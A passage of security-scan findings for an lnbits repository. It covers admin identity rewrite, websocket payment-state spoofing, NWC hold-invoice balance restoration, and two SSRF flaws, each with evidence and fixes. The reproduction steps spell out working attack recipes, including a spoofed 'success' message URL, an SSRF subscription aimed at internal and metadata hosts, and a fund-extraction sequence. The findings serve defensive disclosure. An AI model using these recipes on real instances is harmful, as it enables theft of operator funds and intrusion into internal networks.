5. [lnbits/core/views/auth\_api.py:166–181](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L166-L181)
   nostr_login resolves the account by pubkey; after the admin writes their own pubkey onto the victim, a NIP-98 login yields a first-class session for the victim (when nostr auth is enabled).
6. [lnbits/core/views/auth\_api.py:661–686](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L661-L686)
   _handle_sso_login resolves by email (active_only=False) and logs in; the admin can set the victim's email to one asserted by an IdP they control (when SSO is enabled).
7. [lnbits/core/views/auth\_api.py:201–217](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L201-L217)
   The sanctioned admin-to-user mechanism, impersonation, refuses admin targets and marks the session with impersonated_by; PUT user gives an unmarked session on admin targets.
8. [lnbits/core/services/two\_factor.py:337–351](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/two_factor.py#L337-L351)
   Impersonated sessions are blocked from security_operation paths and require the actor's fresh MFA; a session obtained through identity rewrite carries no impersonated_by and escapes these restrictions. Line 343 is the one constraint on the username-swap vector: the victim's two_factor revision must equal the token's mfa_revision (both empty for accounts that never changed password or enrolled 2FA).

## Impact
Integrity: an unmarked session on any non-super account including other admins lets the attacker change the victim's pubkey, enrol/alter 2FA, set a password on password-less accounts and act under their identity — exactly what impersonation (no admin targets, no security operations) and super-only reset_password withhold from admins. Confidentiality: limited new reach — admins already read every wallet's keys and payments via the users API; what is added is the victim's session-bound state (ACLs, 2FA status, extension data under their user id). Availability: renaming/deactivating accounts is already conceded to admins, so no new loss.

## Reproduction steps
1. Attacker is any admin with a password-based session (PR:HIGH), acting over the network through the documented users API with two PUT calls plus a login. Vector (a) needs a victim whose two_factor revision is still the default "" (never changed password/enrolled 2FA); vector (b) needs nostr or SSO login enabled — conditions outside the attacker's control (AT:PRESENT). No victim interaction.

## Recommended fix
1. PUT /users/api/v1/user lets a non-super admin rewrite identity attributes (username, pubkey, email) of other admins and users, which the impersonation feature deliberately forbids. Fix criteria: A non-super admin cannot change username, pubkey or email of another admin account; changing them for ordinary users is either reserved to the super user or requires the target's own re-authentication. Verify: an admin PUT that alters these fields on another admin returns 403; the username-swap and pubkey/email login sequences described no longer yield a session for the target.
2. Changing an account's username/pubkey/email does not invalidate its existing sessions, and session tokens resolve by mutable username. Fix criteria: Any change to identity attributes bumps the account's two_factor.revision (or equivalent) so outstanding tokens are rejected, and tokens are resolved by the immutable account id. Verify: after renaming victim V onto the attacker token's sub, requests with that token are rejected rather than resolved to V.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257413

---

# Anonymous GET/POST injects arbitrary messages into any websocket channel, spoofing payment state

## Details
The generic pub/sub channel exposes two unauthenticated publish endpoints, `POST /api/v1/ws/{item_id}` and `GET /api/v1/ws/{item_id}/{data}` (websocket_api.py:50-65), which push the caller's text verbatim to every subscriber of the channel. LNbits reuses the very same channel ids for its own authoritative notifications: `send_ws_payment_notification` (notifications.py:337-356) publishes `{"pending": false, "status": "success"}` on the `payment_hash` channel and `{"wallet_balance": ..., "payment": {...}}` on the wallet inkey/adminkey channels. `WebsocketConnectionManager.send` fans out without marking the origin, so clients cannot distinguish a server notification from an injected one.

Cross-principal paths traced end to end:

1. Payment-settled spoofing by the payer. Every payer knows the payment hash from the bolt11 they are shown. `GET /api/v1/ws/<payment_hash>/%7B%22pending%22%3Afalse%2C%22status%22%3A%22success%22%7D` is delivered to every UI waiting on that hash. The WASM extension bridge (wasm-extension-component.js:1110-1152) subscribes extension UIs to the hashes they created and, on `pending===false` or a settled status, emits `payment.settled` to the extension UI and closes the subscription — a point-of-sale/paywall extension UI shows the merchant a paid state with no payment. The project's own WASM guidance (docs/wasm-extensions.md: "Treat browser payment/channel messages as UI updates, not proof that funds were received") confines the damage to the displayed state, but that displayed state is exactly what a merchant acts on. The core pay-to-enable dialog (extensions.js:870-884) also fires 'Invoice Paid!' on the same message; its subsequent enable call re-verifies server-side, so there the effect is only a false toast.

2. Balance / 'payment received' spoofing by an invoice-key holder. The wallet page subscribes with the wallet invoice key (lnbits-manage-wallet-list.js:73), which the threat model notes is embedded in public apps. The holder reads the wallet_id from `GET /api/v1/payments` (inkey-only, payment_api.py:100-110; `GET /api/v1/wallet` returns `id` only for the admin key) and pushes `{"wallet_balance": N, "payment": {"wallet_id": "<id>", "amount": 1}}`. The owner's UI overwrites the displayed balance with N, closes the open receive/invoice dialog via the `updatePaymentsHash` watcher (wallet.js:949-951), and fires the confetti reaction; the balance is never re-fetched from the server (only the payments list is), so the forged figure persists until reload. The invoice key is receive-only by design and never conceded the ability to drive the owner's UI.

3. Secondary: the same endpoints let anyone who knows the super-user id push text into the admin live-log stream (logger.py:52 publishes on sha256(super_user); lnbits-admin-security.js:119 appends received text to `logs`).

The docs (docs/devs/websockets.md) and tests/api/test_websocket_api.py present the GET/POST publish as a developer convenience for arbitrary ids; nothing fences it from the ids the server uses for payment and balance notifications. Root cause: a single, anonymously writable namespace is shared between server-authoritative notifications and client publication, so subscribers' trust in the channel is unfounded. Server-side ledger state is unaffected.

## Evidence
1. [lnbits/core/views/websocket\_api.py:50–65](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/websocket_api.py#L50-L65)
   POST /api/v1/ws/{item_id} and GET /api/v1/ws/{item_id}/{data} carry no authentication dependency and forward the caller-supplied `data` string verbatim to every subscriber of `item_id`; nothing restricts item_id away from the channel ids the server itself publishes on.
2. [lnbits/core/services/notifications.py:337–356](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L337-L356)
   send_ws_payment_notification publishes the server's authoritative {wallet_balance, payment} on the wallet inkey and adminkey channels and {pending, status} on the payment_hash channel. The payment hash is known to every payer from the bolt11; the inkey is the receive-only key embedded in public apps.
3. [lnbits/core/services/websockets.py:55–57](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/websockets.py#L55-L57)
   send() fans the text out to all connections registered under the id; there is no distinction between server-originated and HTTP-injected messages, so subscribers cannot tell them apart.
4. [lnbits/static/js/wasm-extension-component.js:1110–1152](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/wasm-extension-component.js#L1110-L1152)
   The WASM extension bridge subscribes the extension UI to /api/v1/ws/<payment_hash> for hashes the extension created and, on any message with pending===false or status in {success,settled,paid}, emits a `payment.settled` bridge event and closes the subscription. A payer injecting that JSON makes the merchant-side extension UI report settlement.
5. [lnbits/static/js/components/lnbits-manage-wallet-list.js:42–74](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-manage-wallet-list.js#L42-L74)
   The wallet page subscribes with the wallet *invoice key*; onWebsocketMessage overwrites the sidebar and current-wallet `sat` with `wallet_balance` from any message whose payment.wallet_id matches, toggles updatePayments/updatePaymentsHash, and fires eventReaction (confetti) for amount > 0. No server re-fetch of the balance follows.
6. [lnbits/static/js/pages/wallet.js:949–951](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/wallet.js#L949-L951)
   The receive (invoice QR) dialog is closed solely by the ws-driven updatePaymentsHash toggle; there is no server-side polling of the invoice, so an injected inkey-channel message closes the dialog as if the invoice had been paid.
7. [lnbits/core/views/payment\_api.py:100–109](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L100-L109)
   GET /api/v1/payments requires only the invoice key and returns Payment objects including wallet_id, so an inkey holder learns the wallet_id needed to make the wallet UI accept the forged message (GET /api/v1/wallet returns id only for the admin key).
8. [lnbits/static/js/pages/extensions.js:870–884](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/extensions.js#L870-L884)
   Core pay-to-enable UI subscribes to /api/v1/ws/<payment_hash> and shows 'Invoice Paid!' on pending===false; the follow-up enable call re-verifies server-side, so here the effect is limited to a false toast (self-only).

## Impact
Integrity of client-side payment/balance state is subverted: a merchant-side extension UI reports settlement for an unpaid invoice; a wallet owner's page shows a fabricated balance, closes the invoice dialog and celebrates a payment that never arrived. The apipayments ledger and server-side enable/invoice-paid handlers re-verify from the DB, so no funds move and no server state changes; integrity LOW, confidentiality and availability NONE.

## Reproduction steps
1. Attacker needs only the instance URL and a channel id they legitimately possess: the payment hash of an invoice presented to them (payer → merchant WASM extension UI) or an invoice key embedded in a public app (→ wallet owner's UI). One unauthenticated HTTP GET or POST; no credentials, no race, no defence to defeat. The victim must have the subscribing page open when the message is sent (UI:P). The endpoints are documented as public and tested as such; no deployment fencing is documented.

## Recommended fix
1. Unauthenticated HTTP publish endpoints address the same channel ids the server uses for authoritative payment, balance and log notifications. Fix criteria: Client-originated publication must not reach channels the server uses for its own notifications: either require authorization proving control of the channel (e.g. the wallet admin key for inkey/adminkey channels, no client publication at all for payment_hash and log channels) or namespace server notifications so the public update endpoints cannot address them. After the fix, a GET/POST to /api/v1/ws/<payment_hash>/... or /api/v1/ws/<inkey>/... by a payer or inkey holder is not delivered to subscribers of the server's notification channel.
2. Core and bridge clients treat any message on a notification channel as an authoritative settlement/balance update. Fix criteria: The wallet UI and the WASM bridge confirm payment/balance state through an authenticated API read (e.g. GET /api/v1/payments/{hash}, GET /api/v1/wallet) before displaying 'paid', updating the balance or emitting payment.settled, so a forged channel message alone cannot change displayed payment state.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing Authentication
**CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257411

---

# NWC outgoing payment marked failed on invoice expiry while HTLC still in flight

## Details
The NWC funding source infers that an outgoing Lightning payment has failed from a condition that is not terminal. `_payment_data_is_failed()` (lnbits/wallets/nwc.py:419-429) returns True whenever a transaction record's `state` is not `settled`/`failed`/`expired` and the current time is past `expires_at` — or, when the service omits `expires_at`, past `created_at + 3600`. The function has no `type` check and is shared by `get_invoice_status()` and `get_payment_status()`. For an outgoing payment the `lookup_invoice`/`list_transactions` record describes the invoice being paid; its expiry says nothing about whether the HTLC has resolved, and a held HTLC can settle long after the invoice expires (its bound is the CLTV window, measured in blocks). `_payment_data_to_status()` (431-441) converts this into `PaymentStatus(False)`, which `get_payment_status()` (731-745) returns to the core and caches for 24 h as terminal.

The core treats `failed` as definitive: `update_pending_payment()` (lnbits/core/services/payments.py:422-438) sets the payment to `PaymentState.FAILED`, and the `balances` view (lnbits/core/migrations.py:945-957) counts outgoing payments only while they are success/pending, so the payer's balance is restored. The core's own rule at payments.py:941-944 — 'any ambiguous payment responses MUST be set as pending' — is violated. Sibling backends (Alby maps only CREATED/SETTLED; Blink and LNbitsWallet fail only on an explicit failed status; NWC's own `test_nwc_reconciles_explicit_payment_failure` and `test_nwc_only_explicit_payment_failure_is_failed` document that only explicit failure is final) do not infer failure from expiry.

A pending outgoing payment reaches this path because `pay_invoice()` (nwc.py:670-675) returns pending with `checking_id=payment_hash` when the NWC request times out after `subscription_timeout` (10 s, nwc.py:792) — the normal outcome when the payee holds the HTLC. The re-check is reachable on demand through the unauthenticated `GET /api/v1/payments/{payment_hash}` (lnbits/core/views/payment_api.py:429-455) and periodically through `check_pending_payments()`.

This holds when the operator's funding source is `NWCWallet` (a documented production backend, docs/guide/wallets.md:389-397). It assumes the NIP-47 service reports an in-flight outgoing payment as `state: "pending"` with `expires_at` taken from the bolt11, as the NIP-47 `lookup_invoice` response fields define (e.g. Alby Hub); with a service that omits `expires_at`, the same inference fires for any payment held longer than one hour.

## Evidence
1. [lnbits/wallets/nwc.py:419–429](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L419-L429)
   _payment_data_is_failed(): returns True for any transaction record (no `type` check) whose `state` is not settled/failed/expired once time.time() > expires_at, where expires_at defaults to created_at + 3600 when the service omits it. For an outgoing payment the record describes the invoice being paid; its expiry is not a terminal state for an in-flight HTLC, which can still settle hours later within its CLTV window.
2. [lnbits/wallets/nwc.py:431–441](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L431-L441)
   _payment_data_to_status() turns the inferred failure into PaymentStatus(False) — the definitive 'failed' signal the core acts on; it is evaluated against the current time even on a cached pending record.
3. [lnbits/wallets/nwc.py:731–745](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L731-L745)
   get_payment_status() (outgoing payments) delegates to _get_status_via_transactions(checking_id, [False]), whose lookup_invoice branch (706-712) caches the service record and returns _payment_data_to_status(); the inferred failure is cached with the 24 h terminal TTL (479-488).
4. [lnbits/wallets/nwc.py:670–675](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L670-L675)
   pay_invoice(): when the NWC pay_invoice call does not resolve within NWCConnection.subscription_timeout (10 s, line 792; _handle_timeouts sets Exception('timed out') at 964-974) the generic except returns PaymentResponse(checking_id=payment_hash), i.e. pending — so a held payment lands in the core's pending path with the balance deducted.
5. [lnbits/core/services/payments.py:422–438](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L438)
   update_pending_payment(): check_payment_status() → funding_source.get_payment_status(); if status.failed the outgoing payment is set to PaymentState.FAILED via update_payment() with no further guard. Lines 941-944 state the core's rule that ambiguous responses MUST be pending — the NWC inference violates it.
6. [lnbits/core/migrations.py:945–956](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L945-L956)
   The balances view deducts outgoing payments only while status IN ('success','pending'); a FAILED outgoing payment restores the payer's spendable balance even though the HTLC is still in flight and can settle.
7. [lnbits/core/views/payment\_api.py:429–454](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L429-L454)
   GET /api/v1/payments/{payment_hash} needs no key and calls update_pending_payment() on any pending payment, so the payer can trigger the re-check the moment the invoice expiry has passed; check_pending_payments() (payments.py:441-471) also runs it every lnbits_funding_source_pending_interval_seconds (1800 s default).

## Impact
The attacker receives the sats at their node while their LNbits balance is restored: the apipayments ledger records a FAILED payment the funding source actually paid out, so funds are extracted from the operator's pot that backs all users' wallets. Repeatable for any amount the attacker can temporarily fund. No confidentiality impact; no direct availability impact.

## Reproduction steps
1. Attacker: any LNbits user with a funded wallet on an instance backed by NWCWallet. They create a hold invoice with a short expiry (e.g. 60 s) on their own node and pay it via POST /api/v1/payments; the NWC service's pay_invoice does not resolve, LNbits' call times out at 10 s, and the core keeps the payment pending (balance deducted). After expiry the attacker polls GET /api/v1/payments/<hash> (no key): lookup_invoice yields state pending with past expires_at → PaymentStatus(False) → FAILED → balance restored. They then settle the hold invoice within its CLTV window. Requires an NWC backend and a payee node that holds HTLCs (AT:P).

## Recommended fix
_payment_data_is_failed() treats invoice expiry (or a default one-hour window after created_at) as proof of failure regardless of transaction type, so get_payment_status() reports a definitive failure for an outgoing payment whose HTLC may still settle, and the core refunds the payer's balance while the funding source later pays out. Fix criteria: For outgoing payments, get_payment_status() must return failed only when the service reports an explicit terminal failure state (e.g. state == 'failed'); the expiry inference must apply only to incoming invoices (type == 'incoming' / get_invoice_status). Verify: a lookup_invoice record {type: outgoing, state: pending, settled_at: null, expires_at: <past>}, or one with expires_at absent and created_at > 1 h ago, yields a pending PaymentStatus from get_payment_status(), update_pending_payment() leaves the core payment PENDING and the wallet balance unchanged, and the record is not cached as terminal.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Business logic error
**CWE:** [CWE-372](https://cwe.mitre.org/data/definitions/372.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257410

---

# Web-push subscription endpoint stored unvalidated, giving users blind SSRF on every payment

## Details
`POST /api/v1/webpush` (lnbits/core/views/webpush_api.py:38-53) lets any authenticated account register a push subscription. The handler does `json.loads(data.subscription)` and takes `endpoint = subscription['endpoint']` verbatim; `create_webpush_subscription` persists both the endpoint and the raw subscription string with no validation of scheme, host, port or resolved address.

Trigger: every payment notification for a wallet of that user runs `send_payment_notification` -> `send_payment_push_notification` -> `send_push_notification` (notifications.py:282-433), which calls `pywebpush.webpush(json.loads(subscription.data), ...)`. An attacker needs no third party: paying an invoice of one of their own wallets from another of their wallets settles internally (`services/payments.py:863-869`) and enqueues the receiving payment on `internal_invoice_queue`, whose core listener is `dispatch_payment_notification` (app.py:583). The sender side is notified too via `_send_payment_notification_in_background`.

Sink behaviour (assumption on the pinned pywebpush 2.2.1 / requests): `WebPusher.send` issues `requests.post(subscription_info['endpoint'], data=<aes128gcm ciphertext>, headers={TTL, Content-Encoding, Authorization: vapid ...})` with default redirect following, so 307/308 chains from an attacker-controlled public host can also re-aim the POST at `http://` internal targets; TLS verification stays on, so direct https targets with untrusted certificates fail at handshake while plain http targets (e.g. `http://169.254.169.254/...`, `http://10.0.0.5:8080/admin`) receive the POST. pywebpush requires a VAPID private key when claims are passed (it raises before sending otherwise), and LNbits guarantees one: `check_webpush_settings()` (services/settings.py:18-39, called from app.py:103 at startup) generates a VAPID key pair when none is configured, so the send path is always live in production.

Observability: the response body is never returned, but a 410 from the target deletes the subscription (`delete_webpush_subscriptions`), which the attacker can read back via `DELETE /api/v1/webpush?endpoint=<b64>` returning `{"count": 0|1}`; other failures only reach the server log. Impact is therefore blind SSRF from the LNbits host into the operator's network with an opaque body and attacker-chosen URL (host, port, path, query). The sibling payment-webhook sender in the same module (`_post_webhook`, notifications.py:470-503, plus `check_callback_url`) resolves the host, rejects non-global addresses unless `lnbits_callback_allow_private_ips`, pins the IP and disables redirects; none of that is applied to push endpoints.

Related: the blocking/no-timeout nature of this same call is filed separately as webpush-blocking-send-no-timeout-stalls-event-loop; this record is the destination-control defect.

## Evidence
1. [lnbits/core/views/webpush\_api.py:38–52](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/webpush_api.py#L38-L52)
   `endpoint = subscription['endpoint']` is taken from the client-supplied JSON and persisted together with the raw subscription blob; no scheme/host/port/resolved-IP validation, unlike payment webhooks which go through check_callback_url and the private-IP check in _post_webhook. This is where the fix belongs.
2. [lnbits/core/services/notifications.py:410–432](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L410-L432)
   send_push_notification passes json.loads(subscription.data) to pywebpush.webpush(), which POSTs to subscription_info['endpoint'] (requests.post, redirects followed by default — assumption on pywebpush 2.2.1); a 410 deletes the subscription, giving a coarse status oracle readable through DELETE /api/v1/webpush's count.
3. [lnbits/core/crud/webpush.py:27–40](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/webpush.py#L27-L40)
   Endpoint and raw subscription data are stored verbatim; the stored data later drives the outbound request.
4. [lnbits/core/services/payments.py:863–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L863-L869)
   Trigger under the attacker's sole control: an internal payment between two wallets of the same user notifies the sender and enqueues the receiver's payment on internal_invoice_queue, whose core listener (dispatch_payment_notification, app.py:583) reaches send_payment_push_notification.
5. [lnbits/core/services/settings.py:17–39](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/settings.py#L17-L39)
   check_webpush_settings() (called at startup from app.py:103) generates a VAPID key pair when none is configured, so the pywebpush send path — which requires a private key when claims are passed — is always active in production.
6. [lnbits/core/services/notifications.py:470–502](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L470-L502)
   Contrast: the sibling payment-webhook sender resolves the host, rejects non-global addresses unless lnbits_callback_allow_private_ips, pins the IP and disables redirects. None of that is applied to push endpoints, showing the project treats user-chosen callback destinations as a boundary it enforces.

## Impact
LNbits itself leaks little (only a 410-or-not oracle via the subscription's continued existence). Integrity LOW because the server is made to emit attacker-directed requests carrying its VAPID signature; no confidentiality or availability impact on LNbits from this defect alone. Subsequent-system impact: Internal services reachable from the LNbits host (admin panels, metadata endpoints, the funding node's REST port) receive unauthenticated POSTs with an opaque aes128gcm body at attacker-chosen paths; side effects are limited to endpoints that act on a POST regardless of body, and only a coarse status oracle returns, so integrity LOW, confidentiality NONE.

## Reproduction steps
1. Any registered account (registration open by default) posts {"subscription": "{\"endpoint\": \"http://10.0.0.5:8080/admin/x\", \"keys\": {\"p256dh\": <valid P-256 point>, \"auth\": <16 bytes>}}"}, then pays an invoice of one of its own wallets from another; the internal settlement path notifies both wallets and the server POSTs to the chosen URL. A VAPID key is always present (auto-generated at startup), so no configuration is needed and there is no race.

## Recommended fix
Push endpoint URLs supplied by users are stored and later requested without any destination validation, while the equivalent user-chosen callback path (payment webhooks) enforces a private-IP block, IP pinning and no redirects. Fix criteria: Validate the endpoint at registration and again immediately before sending: require https, apply check_callback_url / lnbits_callback_url_rules, resolve the host and reject non-global, loopback and link-local addresses unless the operator explicitly allows private callbacks, and send without following redirects; a subscription pointing at a disallowed destination must be rejected and never contacted.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257405

---

# Unauthenticated SSRF with response disclosure via extension config.json description_md URL

## Details
`ExtensionRelease.fetch_release_details()` (lnbits/core/models/extensions.py:485-499) fetches a release's `details_link`, reads the response as a raw JSON dict, and when that dict has a `description_md` key it issues a second server-side GET to whatever URL the value holds (:492) and replaces the value with the full response body (:494). The only caller, `GET /api/v1/extension/{ext_id}/details?details_link=...` (lnbits/core/views/extension_api.py:276-297), has no authentication dependency — every sibling management route uses check_admin/check_account_exists — and returns that dict directly to the HTTP client.

Who controls the URLs: for every `repos` entry in a configured manifest (the defaults, lnbits/lnbits-extensions and lnbits/lnbits-extensions-wasm, list many third-party repositories), `details_link` is `https://raw.githubusercontent.com/{org}/{repo}/{tag}/config.json` (:84-85). That file is written by the extension author, a third party relative to the LNbits operator, and can be changed at any tag without any admin action on the LNbits instance. The endpoint's only check, `release.details_link == details_link` (:283), confirms the first-hop URL is advertised by a manifest; it does not constrain the second hop at all. The fetch uses a bare `httpx.AsyncClient()` with no scheme/host allowlist, no loopback/private/link-local rejection and no size cap, in contrast to the project's own controls for author-derived URLs: `_is_github_token_url` (:1261-1271) limits `github_api_get` to https GitHub hosts and `icon_to_github_url` (:1204-1209) rewrites config tile paths onto github.com.

Result: an extension author (or anyone who compromises a listed repo) plants `"description_md": "http://<internal host>/..."` in config.json; any anonymous client then requests the details endpoint with that extension id and config URL (both derivable from the public manifest and GitHub) and receives the body of LNbits' GET to the internal host — a full-read SSRF from the server's network position with no credentials on the LNbits instance.

Dependency assumptions (httpx 0.27.2 per uv.lock): `AsyncClient()` defaults to follow_redirects=False and a 5 s timeout, supports http and https only, and imposes no response size limit; redirects are not needed since the attacker names the destination directly. The default slowapi limit (200/min, settings.py:469) does not prevent exploitation.

## Evidence
1. [lnbits/core/models/extensions.py:484–499](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L484-L499)
   fetch_release_details() GETs details_link with a bare httpx.AsyncClient(), takes the raw JSON dict (no model parsing), and if it has a 'description_md' key issues a second GET to whatever URL that value holds (:492) and stores the full response text in data['description_md'] (:494). No scheme/host/port restriction, no private-range or loopback check, no body size cap. This is the fix location.
2. [lnbits/core/views/extension\_api.py:276–297](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L276-L297)
   GET /api/v1/extension/{ext_id}/details is the only route in this router with no Depends() guard. Its only check (:283) is that details_link equals a details_link advertised by a configured manifest's releases; that binds the first hop only. It returns fetch_release_details()' dict, including the fetched description_md body, verbatim to the anonymous client (:297).
3. [lnbits/core/models/extensions.py:84–85](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L84-L85)
   For every GitHub-repo entry in a manifest (the default lnbits-extensions and lnbits-extensions-wasm manifests list third-party repos), details_link is https://raw.githubusercontent.com/{org}/{repo}/{tag}/config.json — a file the extension author writes and can change at any tag. The author therefore chooses the second-hop URL; the LNbits operator does not.
4. [lnbits/core/models/extensions.py:1258–1271](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L1258-L1271)
   The project's own control for author/manifest-derived URLs: _GITHUB_TOKEN_HOSTS/_is_github_token_url restrict github_api_get to https api.github.com/raw.githubusercontent.com (and icon_to_github_url :1204-1209 rewrites config tile paths onto github.com). The description_md fetch in fetch_release_details bypasses this allowlist entirely.
5. [lnbits/core/models/extensions.py:422–444](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L422-L444)
   Secondary: for explicit manifest releases details_link is copied verbatim from the manifest (:438), so the first hop is also unbounded; but the manifest author is a party the docs tell admins to trust (extension-install.md:22), so the primary attacker-controlled hop is description_md.

## Impact
Read-only GET from LNbits' network position to any http(s) host/port chosen by the config author, with the response text disclosed to an anonymous caller: lets the attacker enumerate and read unauthenticated internal HTTP services reachable from the server. No write to LNbits state and no LNbits credential is sent with the request. Subsequent-system impact: Sidecar or same-network services that trust network position (funding-node REST APIs, admin UIs, IMDSv1-style metadata endpoints that need no custom header) can leak node information or credentials to the anonymous caller; services requiring a header or token are out of reach since headers cannot be set.

## Reproduction steps
1. An author of a repository listed in a manifest the instance uses (default manifests list dozens of third-party repos) adds a description_md URL pointing at an internal/metadata host to config.json at a release tag. Any anonymous network client then calls GET /api/v1/extension/<id>/details?details_link=https://raw.githubusercontent.com/<org>/<repo>/<tag>/config.json; the route has no auth, the details_link check passes because it matches the advertised release, and the response carries the internal GET's body. Requires an author-controlled entry in a configured manifest (AT:PRESENT); no LNbits credentials, no victim interaction.

## Recommended fix
